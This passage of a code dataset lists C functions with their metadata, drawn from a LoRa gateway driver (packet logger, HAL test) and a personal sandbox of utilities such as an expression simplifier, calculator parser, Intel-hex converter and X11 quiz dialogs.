   printf(\"\\n\");\n                    printf(\" RSSI:%+6.1f SNR:%+5.1f (min:%+5.1f, max:%+5.1f) payload:\\n\", p->rssi, p->snr, p->snr_min, p->snr_max);\n\n                    for (j = 0; j < p->size; ++j) {\n                        printf(\" %02X\", p->payload[j]);\n                    }\n                    printf(\" #\\n\");\n                } else if (p->status == STAT_CRC_BAD) {\n                    printf(\" if_chain:%2d\", p->if_chain);\n                    printf(\" tstamp:%010u\", p->count_us);\n                    printf(\" size:%3u\\n\", p->size);\n                    printf(\" CRC error, damaged packet\\n\\n\");\n                } else if (p->status == STAT_NO_CRC){\n                    printf(\" if_chain:%2d\", p->if_chain);\n                    printf(\" tstamp:%010u\", p->count_us);\n                    printf(\" size:%3u\\n\", p->size);\n                    printf(\" no CRC\\n\\n\");\n                } else {\n                    printf(\" if_chain:%2d\", p->if_chain);\n                    printf(\" tstamp:%010u\", p->count_us);\n                    printf(\" size:%3u\\n\", p->size);\n                    printf(\" invalid status ?!?\\n\\n\");\n                }\n            }\n        }\n\n        /* send a packet every X loop */\n        if (loop_cnt%16 == 0) {\n            /* 32b counter in the payload, big endian */\n            txpkt.payload[16] = 0xff & (tx_cnt >> 24);\n            txpkt.payload[17] = 0xff & (tx_cnt >> 16);\n            txpkt.payload[18] = 0xff & (tx_cnt >> 8);\n            txpkt.payload[19] = 0xff & tx_cnt;\n            i = lgw_send(txpkt); /* non-blocking scheduling of TX packet */\n            j = 0;\n            printf(\"+++\\nSending packet #%d, rf path %d, return %d\\nstatus -> \", tx_cnt, txpkt.rf_chain, i);\n            do {\n                ++j;\n                wait_ms(100);\n                lgw_status(TX_STATUS, &status_var); /* get TX status */\n                printf(\"%d:\", status_var);\n            } while ((status_var != TX_FREE) && (j < 100));\n            ++tx_cnt;\n            printf(\"\\nTX finished\\n\");\n        }\n    }\n\n    if (exit_sig == 1) {\n        /* clean up before leaving */\n        lgw_stop();\n    }\n\n    printf(\"\\nEnd of test for loragw_hal.c\\n\");\n    return 0;\n}", "path": "lora_gateway/libloragw/tst/test_loragw_hal.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- MAIN FUNCTION -------------------------------------------------------- */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n    int i, j; /* loop and temporary variables */\n    struct timespec sleep_time = {0, 3000000}; /* 3 ms */\n\n    /* clock and log rotation management */\n    int log_rotate_interval = 3600; /* by default, rotation every hour */\n    int time_check = 0; /* variable used to limit the number of calls to time() function */\n    unsigned long pkt_in_log = 0; /* count the number of packet written in each log file */\n\n    /* configuration file related */\n    const char global_conf_fname[] = \"global_conf.json\"; /* contain global (typ. network-wide) configuration */\n    const char local_conf_fname[] = \"local_conf.json\"; /* contain node specific configuration, overwrite global parameters for parameters that are defined in both */\n    const char debug_conf_fname[] = \"debug_conf.json\"; /* if present, all other configuration files are ignored */\n\n    /* allocate memory for packet fetching and processing */\n    struct lgw_pkt_rx_s rxpkt[16]; /* array containing up to 16 inbound packets metadata */\n    struct lgw_pkt_rx_s *p; /* pointer on a RX packet */\n    int nb_pkt;\n\n    /* local timestamp variables until we get accurate GPS time */\n    struct timespec fetch_time;\n    char fetch_timestamp[30];\n    struct tm * x;\n\n    /* parse command line options */\n    while ((i = getopt (argc, argv, \"hr:\")) != -1) {\n        switch (i) {\n            case 'h':\n                usage();\n                return EXIT_FAILURE;\n                break;\n\n            case 'r':\n                log_rotate_interval = atoi(optarg);\n                if ((log_rotate_interval == 0) || (log_rotate_interval < -1)) {\n                    MSG( \"ERROR: Invalid argument for -r option\\n\");\n                    return EXIT_FAILURE;\n                }\n                break;\n\n            default:\n                MSG(\"ERROR: argument parsing use -h option for help\\n\");\n                usage();\n                return EXIT_FAILURE;\n        }\n    }\n\n    /* configure signal handling */\n    sigemptyset(&sigact.sa_mask);\n    sigact.sa_flags = 0;\n    sigact.sa_handler = sig_handler;\n    sigaction(SIGQUIT, &sigact, NULL);\n    sigaction(SIGINT, &sigact, NULL);\n    sigaction(SIGTERM, &sigact, NULL);\n\n    /* configuration files management */\n    if (access(debug_conf_fname, R_OK) == 0) {\n    /* if there is a debug conf, parse only the debug conf */\n        MSG(\"INFO: found debug configuration file %s, other configuration files will be ignored\\n\", debug_conf_fname);\n        parse_SX1301_configuration(debug_conf_fname);\n        parse_gateway_configuration(debug_conf_fname);\n    } else if (access(global_conf_fname, R_OK) == 0) {\n    /* if there is a global conf, parse it and then try to parse local conf  */\n        MSG(\"INFO: found global configuration file %s, trying to parse it\\n\", global_conf_fname);\n        parse_SX1301_configuration(global_conf_fname);\n        parse_gateway_configuration(global_conf_fname);\n        if (access(local_conf_fname, R_OK) == 0) {\n            MSG(\"INFO: found local configuration file %s, trying to parse it\\n\", local_conf_fname);\n            parse_SX1301_configuration(local_conf_fname);\n            parse_gateway_configuration(local_conf_fname);\n        }\n    } else if (access(local_conf_fname, R_OK) == 0) {\n    /* if there is only a local conf, parse it and that's all */\n        MSG(\"INFO: found local configuration file %s, trying to parse it\\n\", local_conf_fname);\n        parse_SX1301_configuration(local_conf_fname);\n        parse_gateway_configuration(local_conf_fname);\n    } else {\n        MSG(\"ERROR: failed to find any configuration file named %s, %s or %s\\n\", global_conf_fname, local_conf_fname, debug_conf_fname);\n        return EXIT_FAILURE;\n    }\n\n    /* starting the concentrator */\n    i = lgw_start();\n    if (i == LGW_HAL_SUCCESS) {\n        MSG(\"INFO: concentrator started, packet can now be received\\n\");\n    } else {\n        MSG(\"ERROR: failed to start the concentrator\\n\");\n        return EXIT_FAILURE;\n    }\n\n    /* transform the MAC address into a string */\n    sprintf(lgwm_str, \"%08X%08X\", (uint32_t)(lgwm >> 32), (uint32_t)(lgwm & 0xFFFFFFFF));\n\n    /* opening log file and writing CSV header*/\n    time(&now_time);\n    open_log();\n\n    /* main loop */\n    while ((quit_sig != 1) && (exit_sig != 1)) {\n        /* fetch packets */\n        nb_pkt = lgw_receive(ARRAY_SIZE(rxpkt), rxpkt);\n        if (nb_pkt == LGW_HAL_ERROR) {\n            MSG(\"ERROR: failed packet fetch, exiting\\n\");\n            return EXIT_FAILURE;\n        } else if (nb_pkt == 0) {\n            clock_nanosleep(CLOCK_MONOTONIC, 0, &sleep_time, NULL); /* wait a short time if no packets */\n        } else {\n            /* local timestamp generation until we get accurate GPS time */\n            clock_gettime(CLOCK_REALTIME, &fetch_time);\n            x = gmtime(&(fetch_time.tv_sec));\n            sprintf(fetch_timestamp,\"%04i-%02i-%02i %02i:%02i:%02i.%03liZ\",(x->tm_year)+1900,(x->tm_mon)+1,x->tm_mday,x->tm_hour,x->tm_min,x->tm_sec,(fetch_time.tv_nsec)/1000000); /* ISO 8601 format */\n        }\n\n        /* log packets */\n        for (i=0; i < nb_pkt; ++i) {\n            p = &rxpkt[i];\n\n            /* writing gateway ID */\n            fprintf(log_file, \"\\\"%08X%08X\\\",\", (uint32_t)(lgwm >> 32), (uint32_t)(lgwm & 0xFFFFFFFF));\n\n            /* writing node MAC address */\n            fputs(\"\\\"\\\",\", log_file); // TODO: need to parse payload\n\n            /* writing UTC timestamp*/\n            fprintf(log_file, \"\\\"%s\\\",\", fetch_timestamp);\n            // TODO: replace with GPS time when available\n\n            /* writing internal clock */\n            fprintf(log_file, \"%10u,\", p->count_us);\n\n            /* writing RX frequency */\n            fprintf(log_file, \"%10u,\", p->freq_hz);\n\n            /* writing RF chain */\n            fprintf(log_file, \"%u,\", p->rf_chain);\n\n            /* writing RX modem/IF chain */\n            fprintf(log_file, \"%2d,\", p->if_chain);\n\n            /* writing status */\n            switch(p->status) {\n                case STAT_CRC_OK:       fputs(\"\\\"CRC_OK\\\" ,\", log_file); break;\n                case STAT_CRC_BAD:      fputs(\"\\\"CRC_BAD\\\",\", log_file); break;\n                case STAT_NO_CRC:       fputs(\"\\\"NO_CRC\\\" ,\", log_file); break;\n                case STAT_UNDEFINED:    fputs(\"\\\"UNDEF\\\"  ,\", log_file); break;\n                default:                fputs(\"\\\"ERR\\\"    ,\", log_file);\n            }\n\n            /* writing payload size */\n            fprintf(log_file, \"%3u,\", p->size);\n\n            /* writing modulation */\n            switch(p->modulation) {\n                case MOD_LORA:  fputs(\"\\\"LORA\\\",\", log_file); break;\n                case MOD_FSK:   fputs(\"\\\"FSK\\\" ,\", log_file); break;\n                default:        fputs(\"\\\"ERR\\\" ,\", log_file);\n            }\n\n            /* writing bandwidth */\n            switch(p->bandwidth) {\n                case BW_500KHZ:     fputs(\"500000,\", log_file); break;\n                case BW_250KHZ:     fputs(\"250000,\", log_file); break;\n                case BW_125KHZ:     fputs(\"125000,\", log_file); break;\n                case BW_62K5HZ:     fputs(\"62500 ,\", log_file); break;\n                case BW_31K2HZ:     fputs(\"31200 ,\", log_file); break;\n                case BW_15K6HZ:     fputs(\"15600 ,\", log_file); break;\n                case BW_7K8HZ:      fputs(\"7800  ,\", log_file); break;\n                case BW_UNDEFINED:  fputs(\"0     ,\", log_file); break;\n                default:            fputs(\"-1    ,\", log_file);\n            }\n\n            /* writing datarate */\n            if (p->modulation == MOD_LORA) {\n                switch (p->datarate) {\n                    case DR_LORA_SF7:   fputs(\"\\\"SF7\\\"   ,\", log_file); break;\n                    case DR_LORA_SF8:   fputs(\"\\\"SF8\\\"   ,\", log_file); break;\n                    case DR_LORA_SF9:   fputs(\"\\\"SF9\\\"   ,\", log_file); break;\n                    case DR_LORA_SF10:  fputs(\"\\\"SF10\\\"  ,\", log_file); break;\n                    case DR_LORA_SF11:  fputs(\"\\\"SF11\\\"  ,\", log_file); break;\n                    case DR_LORA_SF12:  fputs(\"\\\"SF12\\\"  ,\", log_file); break;\n                    default:            fputs(\"\\\"ERR\\\"   ,\", log_file);\n                }\n            } else if (p->modulation == MOD_FSK) {\n                fprintf(log_file, \"\\\"%6u\\\",\", p->datarate);\n            } else {\n                fputs(\"\\\"ERR\\\"   ,\", log_file);\n            }\n\n            /* writing coderate */\n            switch (p->coderate) {\n                case CR_LORA_4_5:   fputs(\"\\\"4/5\\\",\", log_file); break;\n                case CR_LORA_4_6:   fputs(\"\\\"2/3\\\",\", log_file); break;\n                case CR_LORA_4_7:   fputs(\"\\\"4/7\\\",\", log_file); break;\n                case CR_LORA_4_8:   fputs(\"\\\"1/2\\\",\", log_file); break;\n                case CR_UNDEFINED:  fputs(\"\\\"\\\"   ,\", log_file); break;\n                default:            fputs(\"\\\"ERR\\\",\", log_file);\n            }\n\n            /* writing packet RSSI */\n            fprintf(log_file, \"%+.0f,\", p->rssi);\n\n            /* writing packet average SNR */\n            fprintf(log_file, \"%+5.1f,\", p->snr);\n\n            /* writing hex-encoded payload (bundled in 32-bit words) */\n            fputs(\"\\\"\", log_file);\n            for (j = 0; j < p->size; ++j) {\n                if ((j > 0) && (j%4 == 0)) fputs(\"-\", log_file);\n                fprintf(log_file, \"%02X\", p->payload[j]);\n            }\n\n            /* end of log file line */\n            fputs(\"\\\"\\n\", log_file);\n            fflush(log_file);\n            ++pkt_in_log;\n        }\n\n        /* check time and rotate log file if necessary */\n        ++time_check;\n        if (time_check >= 8) {\n            time_check = 0;\n            time(&now_time);\n            if (difftime(now_time, log_start_time) > log_rotate_interval) {\n                fclose(log_file);\n                MSG(\"INFO: log file %s closed, %lu packet(s) recorded\\n\", log_file_name, pkt_in_log);\n                pkt_in_log = 0;\n                open_log();\n            }\n        }\n    }\n\n    if (exit_sig == 1) {\n        /* clean up before leaving */\n        i = lgw_stop();\n        if (i == LGW_HAL_SUCCESS) {\n            MSG(\"INFO: concentrator stopped successfully\\n\");\n        } else {\n            MSG(\"WARNING: failed to stop concentrator successfully\\n\");\n        }\n        fclose(log_file);\n        MSG(\"INFO: log file %s closed, %lu packet(s) recorded\\n\", log_file_name, pkt_in_log);\n    }\n\n    MSG(\"INFO: Exiting packet logger program\\n\");\n    return EXIT_SUCCESS;\n}", "path": "lora_gateway/util_pkt_logger/src/util_pkt_logger.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* describe command line options */\n", "func_signal": "void usage(void)", "code": "{\n    printf(\"Library version information: %s\\n\", lgw_version_info());\n    printf( \"Available options:\\n\");\n    printf( \" -h print this help\\n\");\n    printf( \" -a <float> Radio A RX frequency in MHz\\n\");\n    printf( \" -b <float> Radio B RX frequency in MHz\\n\");\n    printf( \" -t <float> Radio TX frequency in MHz\\n\");\n    printf( \" -r <int> Radio type (SX1255:1255, SX1257:1257)\\n\");\n    printf( \" -k <int> Concentrator clock source (0: radio_A, 1: radio_B(default))\\n\");\n}", "path": "lora_gateway/libloragw/tst/test_loragw_hal.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- PRIVATE FUNCTIONS DEFINITION ----------------------------------------- */\n", "func_signal": "static void sig_handler(int sigio)", "code": "{\n    if (sigio == SIGQUIT) {\n        quit_sig = 1;;\n    } else if ((sigio == SIGINT) || (sigio == SIGTERM)) {\n        exit_sig = 1;\n    }\n}", "path": "lora_gateway/util_pkt_logger/src/util_pkt_logger.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* Extract a term from the top level of tree.  A term is defined as a subtree\n * seperated by other subtrees by the infix operators over0 and over1.  *f is\n * incremented each time over1 is found.\n */\n", "func_signal": "LST *extract(SYM *over0, SYM *over1, LST **tree, I *f)", "code": "{\n\tLST *rtn;\n\tLST *subtree;\n\tif (!*tree)\n\t\treturn 0;\n\tif (typ(*tree) != tLST) {\n\t\trtn = *tree;\n\t\t*tree = 0;\n\t\treturn rtn;\n\t}\n\tif ((SYM *)(*tree)->d != over0 && (SYM *)(*tree)->d != over1) {\n\t\trtn = *tree;\n\t\t*tree = 0;\n\t\treturn rtn;\n\t}\n\tsubtree = (*tree)->r->r->d;\n\tif ((SYM *)(*tree)->d == over1)\n\t\t(*f)++;\n\trtn = extract(over0, over1, &subtree, f);\n\tif (subtree)\n\t\t(*tree)->r->r->d = subtree;\n\telse {\n\t\t(*tree)->r->r->d = 0;\n\t\tsubtree = (*tree)->r->d;\n\t\t(*tree)->r->d = 0;\n\t\tdiscard(*tree);\n\t\t*tree = subtree;\n\t}\n\treturn rtn;\n}", "path": "joes-sandbox/x/xquiz/simplify.c", "commit_date": "2018-11-07 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Reduce a fraction to lowest terms */\n", "func_signal": "void reduce(double *t, double *b)", "code": "{\n\tif (*b != 0.0)\n\t\tif (((double)(long)*b) == *b && ((double)(long)*t) == *t) {\n\t\t\tlong g = gcd(abs((long)*t), abs((long)*b));\n\t\t\t*b /= (double)g;\n\t\t\t*t /= (double)g;\n\t\t} else\n\t\t\t*t /= *b, *b = 1.0;\n}", "path": "joes-sandbox/x/xquiz/simplify.c", "commit_date": "2018-11-07 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Scanner */\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n\tint stat;\n\n\tif (argc != 2)\n\t\tfprintf(stderr, \"calc \\'expressions\\'\\n\"), exit(1);\n\n\tstack = yymkstk();\n\ts = argv[1];\n\n\tfor (col = 0;; ++col) {\n\t\tswitch (s[col]) {\n\t\tcase '+':\n\t\t\tstat =\n\t\t\t    yyparse(stack, add, cons(col, col + 1, 0.0));\n\t\t\tbreak;\n\t\tcase '-':\n\t\t\tstat =\n\t\t\t    yyparse(stack, sub, cons(col, col + 1, 0.0));\n\t\t\tbreak;\n\t\tcase '*':\n\t\t\tstat =\n\t\t\t    yyparse(stack, mul, cons(col, col + 1, 0.0));\n\t\t\tbreak;\n\t\tcase '/':\n\t\t\tstat =\n\t\t\t    yyparse(stack, div, cons(col, col + 1, 0.0));\n\t\t\tbreak;\n\n\t\tcase '(':\n\t\t\tstat =\n\t\t\t    yyparse(stack, lparen,\n\t\t\t\t    cons(col, col + 1, 0.0));\n\t\t\tbreak;\n\t\tcase ')':\n\t\t\tstat =\n\t\t\t    yyparse(stack, rparen,\n\t\t\t\t    cons(col, col + 1, 0.0));\n\t\t\tbreak;\n\n\t\tcase '0':\n\t\tcase '1':\n\t\tcase '2':\n\t\tcase '3':\n\t\tcase '4':\n\t\tcase '5':\n\t\tcase '6':\n\t\tcase '7':\n\t\tcase '8':\n\t\tcase '9':\n\t\tcase '.':\n\t\t\t{\n\t\t\t\tint d = col;\n\t\t\t\tdouble v = 0.0;\n\t\t\t\tsscanf(s + col, \"%lg\", &v);\n\t\t\t\twhile (s[col] >= '0' && s[col] <= '9'\n\t\t\t\t       || s[col] == '.')\n\t\t\t\t\t++col;\n\t\t\t\tstat =\n\t\t\t\t    yyparse(stack, constant,\n\t\t\t\t\t    cons(d, col, v));\n\t\t\t\t--col;\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\tcase 0:\n\t\t\tstat = yyparse(stack, yyEND, cons(col, col, 0.0));\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\tstat = 1;\n\t\t\tbreak;\n\t\t}\n\t\tif (stat == -1) {\n\t\t\tint y;\n\t\t\tprintf(\"Syntax error:\\n%s\\n\", s);\n\t\t\tfor (y = 0; y < col; ++y)\n\t\t\t\tprintf(\"-\");\n\t\t\tprintf(\"^\\n\");\n\t\t\treturn 1;\n\t\t} else if (err) {\n\t\t\tint y;\n\t\t\tprintf(\"%s\\n%s\\n\", err, s);\n\t\t\tfor (y = 0; y < errstart; ++y)\n\t\t\t\tprintf(\" \");\n\t\t\tfor (; y < errend; ++y)\n\t\t\t\tprintf(\"-\");\n\t\t\tprintf(\"\\n\");\n\t\t\treturn 1;\n\t\t} else if (stat == 0)\n\t\t\treturn 0;\n\t}\n}", "path": "joes-sandbox/lang/aacc/calc1.c", "commit_date": "2014-10-18 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Unit test */\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n\tchar buf1[128];\n\tchar buf2[128];\n\tchar buf3[128];\n\tint pass = 1;\n\tsrandom(time(NULL));\n\tfor (;;) {\n\t\tlong long x = (((long long)random() << 60) ^ ((long long)random() << 30) ^ (long long)random());\n\t\tdouble v;\n\t\t*(long long *)&v = x;\n\t\tsprintf(buf1, \"%.16G\", v);\n\t\teng(buf2, 128, buf1);\n\t\tv = 0.0;\n//\t\tprintf(\"'%s'\\n\", buf1);\n\t\tv = strtod(buf2, NULL);\n\t\tsprintf(buf3, \"%.16G\", v);\n\t\tif (strcmp(buf1, buf3)) {\n\t\t\tprintf(\"%d: Mismatch in=%s eng=%s g=%G out=%s\\n\", pass, buf1, buf2, v, buf3);\n\t\t}\n\t\tif (++pass % 100000 == 0)\n\t\t\tprintf(\"pass %d\\n\", pass);\n\t}\n}", "path": "joes-sandbox/math/eng.c", "commit_date": "2015-11-18 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Return greatest common divisor of u and v */\n", "func_signal": "long gcd(long u, long v)", "code": "{\n\tlong k, t;\n\tif (u < 0)\n\t\tu = -u;\n\tif (v < 0)\n\t\tv = -v;\n\tif (u == v)\n\t\treturn u;\n\tif (!u)\n\t\treturn v;\n\tif (!v)\n\t\treturn u;\n\n\tk = 0;\n\twhile (!(u & 1) && !(v & 1))\n\t\t++k, u >>= 1, v >>= 1;\n\n\tif (u & 1) {\n\t\tt = -v;\n\t\tgoto b4;\n\t} else\n\t\tt = u;\n\n b3:\tt >>= 1;\n b4:\tif (!(t & 1))\n\t\tgoto b3;\n\tif (t > 0)\n\t\tu = t;\n\telse\n\t\tv = -t;\n\tt = u - v;\n\tif (t)\n\t\tgoto b3;\n\n\treturn u * (1 << k);\n}", "path": "joes-sandbox/x/xquiz/simplify.c", "commit_date": "2018-11-07 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Verify checksum.. */\n", "func_signal": "int cksum(char *buf, unsigned long count)", "code": "{\n        unsigned len;\n        unsigned char tot;\n        unsigned char cksum;\n        unsigned x;\n        tot = 0;\n        len = hextobin(buf + 1) + 4; // Add four bytes for byte count, address and type\n        for (x = 0; x != len; ++x) {\n                tot += hextobin(buf + 1 + x * 2);\n        }\n        cksum = hextobin(buf + 1 + x * 2);\n        tot = (255 & -tot);\n        if (tot != cksum) {\n                fprintf(stderr, \"Checksum mismatch on line %ld (got %x but calculated %x)\\n\", count, cksum, tot);\n                return 1;\n        } else {\n                return 0;\n        }\n}", "path": "joes-sandbox/utils/mcstobin.c", "commit_date": "2020-11-12 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Create a message window */\n", "func_signal": "DSPOBJ *mkmsg(DSPOBJ *in, char *text, char **items, int nitems, void (*func)(int y))", "code": "{\n\tint w1, w2, yy, width, w;\n\tint hght = bheight * 5;\n\tDSPOBJ *dspobj;\n\tMSG *msg;\n\tw1 = XTextWidth(bfs, text, strlen(text)) + bwidth;\n\tfor (yy = 0, w2 = 0; yy != nitems; ++yy) {\n\t\tw = XTextWidth(bfs, items[yy], strlen(items[yy])) + bwidth;\n\t\tif (w > w2)\n\t\t\tw2 = w;\n\t}\n\tw = yy * w2 * 2 + w2;\n\tif (w1 > w)\n\t\twidth = w1;\n\telse\n\t\twidth = w;\n\tdspobj =\n\t    dspopen(in, in->width / 2 - width / 2, in->height / 2 - hght / 2,\n\t\t    width, hght);\n\tdspobj->top->trap = dspobj;\n\tmsg = calloc(1, sizeof(MSG));\n\tXSetFont(dsp, dspobj->gc, bigfont);\n\tXSetWindowBackground(dsp, dspobj->win, hred.pixel);\n\tdspobj->show = msgshow;\n\tdspobj->extend = msg;\n\tdspobj->press = msgclick;\n\tdspobj->close = msgremove;\n\tmsg->items = items;\n\tmsg->w2 = w2;\n\tmsg->h = bheight;\n\tmsg->nitems = nitems;\n\tmsg->func = func;\n\tmsg->text = text;\n\tmsg->x1 = width / 2 - w1 / 2;\n\tmsg->x2 = width / 2 - (w - w2 * 2) / 2;\n\treturn dspobj;\n}", "path": "joes-sandbox/x/xquiz/msg.c", "commit_date": "2015-09-21 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Evaluate */\n", "func_signal": "double ev(LST *n)", "code": "{\n\tSYM *sy = (SYM *)n;\n\tif (n)\n\t\tswitch (typ(n)) {\n\t\tcase tNUM:\n\t\t\treturn ((NUM *) n)->n;\n\t\tcase tSYM:\n\t\t\tif (sy == yPI)\n\t\t\t\treturn M_PI;\n\t\t\tif (sy == yE)\n\t\t\t\treturn M_E;\n\t\t\tif (sy->bind)\n\t\t\t\treturn sy->bind->n;\n\t\t\treturn 0.0;\n\t\tcase tLST:\n\t\t\tsy = (SYM *)n->d;\n\t\t\tif (sy == yADD)\n\t\t\t\treturn ev(n->r->d) + ev(n->r->r->d);\n\t\t\tif (sy == ySUB)\n\t\t\t\treturn ev(n->r->d) - ev(n->r->r->d);\n\t\t\tif (sy == yNEG)\n\t\t\t\treturn -ev(n->r->d);\n\t\t\tif (sy == yEXP)\n\t\t\t\treturn pow(ev(n->r->d), ev(n->r->r->d));\n\t\t\tif (sy == yMUL)\n\t\t\t\treturn ev(n->r->d) * ev(n->r->r->d);\n\t\t\tif (sy == yDIV)\n\t\t\t\treturn ev(n->r->d) / ev(n->r->r->d);\n\t\t\tif (sy == ySQRT)\n\t\t\t\treturn sqrt(ev(n->r->d));\n\t\t\tif (sy == yABS)\n\t\t\t\treturn fabs(ev(n->r->d));\n\t\t\tif (sy == ySIN)\n\t\t\t\treturn sin(ev(n->r->d));\n\t\t\tif (sy == yCOS)\n\t\t\t\treturn cos(ev(n->r->d));\n\t\t\tif (sy == yTAN)\n\t\t\t\treturn tan(ev(n->r->d));\n\t\t\tif (sy == yASIN)\n\t\t\t\treturn asin(ev(n->r->d));\n\t\t\tif (sy == yACOS)\n\t\t\t\treturn acos(ev(n->r->d));\n\t\t\tif (sy == yATAN)\n\t\t\t\treturn atan(ev(n->r->d));\n\t\t\tif (sy == yLOG)\n\t\t\t\treturn log(ev(n->r->d));\n\t\t}\n\treturn 9999.0;\n}", "path": "joes-sandbox/x/xquiz/simplify.c", "commit_date": "2018-11-07 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Undo system */\n", "func_signal": "void wundo(DSPOBJ *dspobj, XButtonEvent *ev)", "code": "{\n\tWORK *work = (dspobj = dspobj->top)->extend;\n\tif (work->undo)\n\t\tif (work->undo->prev) {\n\t\t\tsel = 0;\n\t\t\twork->undo = work->undo->prev;\n\t\t\tdiscard(work->eqn);\n\t\t\twork->eqn = dup(work->undo->eqn);\n\t\t\tshowwork(dspobj);\n\t\t}\n}", "path": "joes-sandbox/x/xquiz/work.c", "commit_date": "2018-10-29 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Function to free a value */\n", "func_signal": "void rm(struct value *v)", "code": "{\n\tif (v)\n\t\tfree(v);\n}", "path": "joes-sandbox/lang/aacc/calc1.c", "commit_date": "2014-10-18 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Italicize text */\n", "func_signal": "int *italicize(int *text, int *siz, int *len)", "code": "{\n\tint attr = 0;\n\tint *ary;\n\tint newlen = 0;\n\tint x;\n\tary = (int *) malloc(sizeof(int) ** siz);\n\tfor (x = 0; text[x]; ++x)\n\t\tif (!(attr & ITAL) && (255 & text[x]) == '_'\n\t\t    && okbeg(text, x) && (attr || thereisokend(text + x)))\n\t\t\tattr |= ITAL;\n\t\telse if ((attr & ITAL) && (255 & text[x]) == '_'\n\t\t\t && okend(text, x))\n\t\t\tattr &= ~ITAL;\n\t\telse\n\t\t\tary[newlen++] = (text[x] | attr);\n\tary[newlen] = 0;\n\tif (newlen >= *siz) {\n\t\tfprintf(stderr, \"??? %d %d %d %d\\n\", newlen, x, *len,\n\t\t\t*siz);\n\t\texit(1);\n\t}\n\t*len = newlen;\n\treturn ary;\n}", "path": "joes-sandbox/doc/psiman/attr.c", "commit_date": "2014-10-26 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Emit a range of memory */\n", "func_signal": "void emit(FILE *f, unsigned long start, unsigned long end)", "code": "{\n        int len = sizeof(buffers->buf);\n        while (start < end) {\n                struct buffer *b;\n                if (end - start < len)\n                        len = end - start;\n                for (b = buffers; b; b = b->next)\n                        if (b->addr == start)\n                                break;\n                if (b) {\n                        fwrite(b->buf, 1, len, f);\n                } else {\n                        fzero(len, f);\n                }\n                start += len;\n        }\n}", "path": "joes-sandbox/utils/mcstobin.c", "commit_date": "2020-11-12 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Set a byte of memory to 'val' */\n", "func_signal": "void set(unsigned long addr, unsigned char val)", "code": "{\n        struct buffer *b;\n        unsigned ofst;\n        if (addr != last) {\n                if (prev != last)\n                        printf(\"  Load from %lx - %lx\\n\", prev, last);\n                prev = addr;\n        }\n        last = addr + 1;\n        ofst = addr % sizeof(buffers->buf);\n        addr -= ofst;\n        for (b = buffers; b; b = b->next) {\n                if (b->addr == addr)\n                        break;\n        }\n        if (!b) {\n                b = calloc(sizeof(struct buffer), 1);\n                if (!b) {\n                        fprintf(stderr, \"Ran out of memory\\n\");\n                        exit(1);\n                }\n                b->next = buffers;\n                buffers = b;\n                b->addr = addr;\n        }\n        b->buf[ofst] = val;\n}", "path": "joes-sandbox/utils/mcstobin.c", "commit_date": "2020-11-12 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Function to construct a value */\n", "func_signal": "struct value *cons(int start, int end, double val)", "code": "{\n\tstruct value *v = (struct value *) malloc(sizeof(struct value));\n\tv->start = start;\n\tv->end = end;\n\tv->val = val;\n\treturn v;\n}", "path": "joes-sandbox/lang/aacc/calc1.c", "commit_date": "2014-10-18 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
{"docstring": "/* Convert ASCII hex to binary\n * Note that range of output is 0 - 255 no matter what junk might be on the input */\n", "func_signal": "unsigned long hextobin(char *ptr)", "code": "{\n\tunsigned char c = 0;\n\tif (*ptr >= '0' && *ptr <= '9')\n\t\tc = 16 * (*ptr & 0xf);\n\t\n\telse\n\t\tc = 16 * ((*ptr & 0xf) + 9);\n\t++ptr;\n\tif (*ptr >= '0' && *ptr <= '9')\n\t\tc += (*ptr & 0xf);\n\t\n\telse\n\t\tc += ((*ptr & 0xf) + 9);\n\treturn c;\n}", "path": "joes-sandbox/utils/mcstobin.c", "commit_date": "2020-11-12 00:00:00", "repo_name": "jhallen/joes-sandbox", "stars": 677, "license": "None", "language": "c", "size": 10383}
